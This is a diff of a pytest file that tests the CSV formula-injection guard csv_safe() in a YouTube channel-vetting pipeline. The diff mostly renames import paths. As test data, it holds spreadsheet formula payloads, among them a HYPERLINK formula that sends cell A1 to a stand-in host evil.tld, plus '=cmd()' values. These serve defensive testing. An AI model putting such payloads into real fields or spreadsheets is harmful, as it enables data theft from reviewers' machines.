@@ -2,7 +2,7 @@
 CSV / formula injection into the reviewer's spreadsheet.
 
 Airtable is not a formula-eval context, so nothing in these records
-executes when they're pushed — which is exactly why `main.csv_safe()` looks
+executes when they're pushed — which is exactly why `pipeline.csv_safe()` looks
 like a pointless prefix and is at risk of being "cleaned up". The eval
 context is one step further downstream: a reviewer exports the Airtable
 view to CSV and opens it in Excel or Google Sheets, and a cell whose first
@@ -10,7 +10,7 @@ character is =, +, -, @ or a leading tab/CR is parsed there as a FORMULA.
 
 Two of the fields written are attacker-influenced — "Channel Name" is
 whatever the channel owner typed, and "Email" can come out of
-browser_email.py scraping arbitrary third-party sites — so a channel called
+enrichment/email_browser.py scraping arbitrary third-party sites — so a channel called
 `=HYPERLINK("http://evil.tld?d="&A1,"click")` becomes a live payload on the
 reviewer's machine.
 
@@ -22,7 +22,7 @@ genuinely numeric and Airtable's Number fields reject strings.
 No network: the record test monkeypatches every YouTube/Airtable call.
 """
 import pytest
-from search_zones import ZONE_CORE
+from channel_vetting.discovery.search_zones import ZONE_CORE
 
 
 # --- the dangerous prefixes ----------------------------------------------
@@ -35,7 +35,7 @@ def test_every_formula_prefix_is_neutralised(prefix):
     "this cell is literal text" — Excel and Sheets both consume it on
     import and show the original string.
     """
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     assert csv_safe(prefix + "SUM(A1:A9)") == "'" + prefix + "SUM(A1:A9)"
 
@@ -47,7 +47,7 @@ def test_the_prefix_list_is_the_documented_one():
     stripped by some CSV importers *before* the formula check runs, which
     puts the "=" back at the front.
     """
-    from main import SPREADSHEET_FORMULA_PREFIXES
+    from channel_vetting.pipeline import SPREADSHEET_FORMULA_PREFIXES
 
     assert set(SPREADSHEET_FORMULA_PREFIXES) == {"=", "+", "-", "@", "\t", "\r"}
 
@@ -57,14 +57,14 @@ def test_a_realistic_hyperlink_payload_is_neutralised():
     The actual attack: HYPERLINK exfiltrates neighbouring cells to a
     third-party host the moment the reviewer clicks what looks like a link.
     """
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     payload = '=HYPERLINK("http://evil.tld","x")'
     assert csv_safe(payload) == "'" + payload
 
 
 def test_a_cell_reference_exfiltration_payload_is_neutralised():
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     payload = '=HYPERLINK("http://evil.tld?d="&A1,"click")'
     assert csv_safe(payload).startswith("'=")
@@ -75,14 +75,14 @@ def test_neutralisation_preserves_the_original_text_after_the_apostrophe():
     The value is prefixed, never rewritten or escaped — a reviewer must
     still be able to read the real channel name out of the cell.
     """
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     assert csv_safe("=cmd()")[1:] == "=cmd()"
 
 
 def test_only_one_apostrophe_is_added():
     """A single quote is the whole fix; doubling it would show up in the cell."""
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     assert csv_safe("=1+1") == "'=1+1"
     assert not csv_safe("=1+1").startswith("''")
@@ -115,13 +115,13 @@ def test_only_one_apostrophe_is_added():
     ],
 )
 def test_ordinary_values_are_byte_identical(value):
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     assert csv_safe(value) == value
 
 
 def test_a_dangerous_character_anywhere_but_the_front_is_ignored():
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     assert csv_safe("2+2 review") == "2+2 review"
     assert csv_safe("Reviews = honest") == "Reviews = honest"
@@ -138,7 +138,7 @@ def test_non_strings_pass_through_with_their_type_intact(value):
     the API. Stringifying a value here would fail the push for every
     record, so csv_safe has to be a no-op on anything that isn't a string.
     """
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     result = csv_safe(value)
     assert result == value
@@ -146,7 +146,7 @@ def test_non_strings_pass_through_with_their_type_intact(value):
 
 
 def test_none_is_not_turned_into_a_string():
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     assert csv_safe(None) is None
 
@@ -157,7 +157,7 @@ def test_a_negative_number_is_not_quoted():
     must stay a number; this is the case that would silently break a Number
     field if the isinstance check were dropped.
     """
-    from main import csv_safe
+    from channel_vetting.pipeline import csv_safe
 
     assert csv_safe(-5) == -5
     assert isinstance(csv_safe(-5), int)
@@ -214,24 +214,24 @@ def _stub_performance(**overrides):
 
 def _build_record(monkeypatch, *, channel_title="Chan", email="", content_language="en"):
     """process_candidate() with every network call stubbed out."""
-    import main
+    from channel_vetting import pipeline
 
-    monkeypatch.setattr(main, "get_channel_stats", lambda cid: _stub_stats(channel_title=channel_title))
+    monkeypatch.setattr(pipeline, "get_channel_stats", lambda cid: _stub_stats(channel_title=channel_title))
     monkeypatch.setattr(
-        main, "get_recent_video_performance",
+        pipeline, "get_recent_video_performance",
         lambda cid, pl: _stub_performance(content_language=content_language),
     )
-    monkeypatch.setattr(main, "channel_age_months", lambda published_at: 100)
+    monkeypatch.setattr(pipeline, "channel_age_months", lambda published_at: 100)
     # process_candidate calls resolve_email_with_source (it needs the
     # link-list-presence flag); None here keeps the no-social drop dormant.
     monkeypatch.setattr(
-        main, "resolve_email_with_source", lambda *a, **k: (email, "test-source", None)
+        pipeline, "resolve_email_with_source", lambda *a, **k: (email, "test-source", None)
     )
-    monkeypatch.setattr(main.time, "sleep", lambda s: None)
+    monkeypatch.setattr(pipeline.time, "sleep", lambda s: None)
 
     candidate = {"channel_id": "UC1", "channel_title": channel_title, "matched_keywords": []}
     niche_config = {"min_avg_views": 10_000, "min_channel_age_months": None, "allowed_country_codes": ZONE_CORE}
-    record, _qualification = main.process_candidate(
+    record, _qualification = pipeline.process_candidate(
         candidate, {}, _NullBlocklist(), niche_config, None,
     )
     assert record is not None, "the stub channel must clear every gate for this test to mean anything"
@@ -247,7 +247,7 @@ def test_a_hostile_channel_name_reaches_airtable_neutralised(monkeypatch):
 def test_the_channel_id_is_not_neutralised(monkeypatch):
     """
     The exclusion that matters most. Channel ID is the dedupe key
-    airtable_client.channel_exists() looks up by, so a leading apostrophe
+    airtable.client.channel_exists() looks up by, so a leading apostrophe
     would make every existing row invisible to that lookup and the pipeline
     would POST duplicates instead of PATCHing.
     """
@@ -281,8 +281,8 @@ def test_the_single_selects_are_not_neutralised(monkeypatch):
     would quietly mint a new option and drop the row out of the reviewer's
     saved views.
     """
-    from config import DEFAULT_STATUS
-    from scoring import QUALIFIED
+    from channel_vetting.config import DEFAULT_STATUS
+    from channel_vetting.ranking.scoring import QUALIFIED
 
     record = _build_record(monkeypatch, channel_title="=cmd()")
 
@@ -313,7 +313,7 @@ def test_an_ordinary_channel_name_and_email_are_written_unchanged(monkeypatch):
 def test_a_hostile_content_language_is_dropped_outright(monkeypatch):
     """
     Content Language is no longer attacker-influenced: the English gate
-    (main.is_english) requires the tag to START with "en", and no value
+    (pipeline.is_english) requires the tag to START with "en", and no value
     beginning with =, +, -, @ or whitespace can do that. So a formula payload
     in this field can't reach Airtable at all — a stronger guarantee than the
     csv_safe neutralisation this test used to assert.
@@ -323,17 +323,17 @@ def test_a_hostile_content_language_is_dropped_outright(monkeypatch):
     Calls process_candidate directly rather than via _build_record, which
     asserts a record WAS built.
     """
-    import main
+    from channel_vetting import pipeline
 
-    monkeypatch.setattr(main, "get_channel_stats", lambda cid: _stub_stats())
+    monkeypatch.setattr(pipeline, "get_channel_stats", lambda cid: _stub_stats())
     monkeypatch.setattr(
-        main, "get_recent_video_performance",
+        pipeline, "get_recent_video_performance",
         lambda cid, pl: _stub_performance(content_language="=cmd()"),
     )
-    monkeypatch.setattr(main, "channel_age_months", lambda published_at: 100)
-    monkeypatch.setattr(main.time, "sleep", lambda s: None)
+    monkeypatch.setattr(pipeline, "channel_age_months", lambda published_at: 100)
+    monkeypatch.setattr(pipeline.time, "sleep", lambda s: None)
 
-    record, reason = main.process_candidate(
+    record, reason = pipeline.process_candidate(
         {"channel_id": "UC1", "channel_title": "Chan", "matched_keywords": []},
         {}, _NullBlocklist(),
         {"min_avg_views": 10_000, "min_channel_age_months": None, "allowed_country_codes": ZONE_CORE}, None,
@@ -350,25 +350,25 @@ def test_content_language_still_goes_through_csv_safe(monkeypatch):
     allowed language, say), this field goes straight back to carrying
     creator-set text into a reviewer's spreadsheet.
     """
-    import main
+    from channel_vetting import pipeline
 
     record = _build_record(monkeypatch, content_language="en-GB")
 
     assert record["Content Language"] == "en-GB"
-    assert record["Content Language"] == main.csv_safe(record["Content Language"])
+    assert record["Content Language"] == pipeline.csv_safe(record["Content Language"])
 
 
 def test_the_source_field_is_neutralised(monkeypatch):
     """Lower risk — Source is built from our own NICHES keywords — but it is
     still a free-text field, so it isn't left uncovered."""
-    import main
+    from channel_vetting import pipeline
 
     record = _build_record(monkeypatch)
 
     # Source starts with SOURCE_LABEL, which is ours and safe — assert it is
     # passed through csv_safe by checking the call is wired, not by faking a
     # hostile keyword list.
-    assert record["Source"] == main.csv_safe(record["Source"])
+    assert record["Source"] == pipeline.csv_safe(record["Source"])
 
 
 def test_the_upload_frequency_string_always_starts_with_a_digit(monkeypatch):
@@ -383,15 +383,15 @@ def test_the_upload_frequency_string_always_starts_with_a_digit(monkeypatch):
 
 # --- The backfill path needs the same guard ------------------------------
 #
-# backfill_missing_emails.py re-runs the email chain over email-less rows and
+# scripts/backfill/backfill_missing_emails.py re-runs the email chain over email-less rows and
 # pushes the result directly, bypassing process_candidate() entirely. Step 4
-# of that chain is browser_email.py scraping arbitrary third-party sites, so
+# of that chain is enrichment/email_browser.py scraping arbitrary third-party sites, so
 # it is exactly as untrusted as the normal path — and it was writing raw.
 
 
 def test_backfill_neutralises_a_formula_email(monkeypatch):
     """A scraped address starting with '=' must not reach Airtable raw."""
-    import backfill_missing_emails as backfill
+    from scripts.backfill import backfill_missing_emails as backfill
 
     pushed = []
     monkeypatch.setattr(
@@ -426,7 +426,7 @@ def test_backfill_neutralises_a_formula_email(monkeypatch):
 
 
 def test_backfill_leaves_an_ordinary_email_byte_identical(monkeypatch):
-    import backfill_missing_emails as backfill
+    from scripts.backfill import backfill_missing_emails as backfill
 
     pushed = []
     monkeypatch.setattr(backfill, "get_records_missing_email", lambda table_name: ["UC1"])
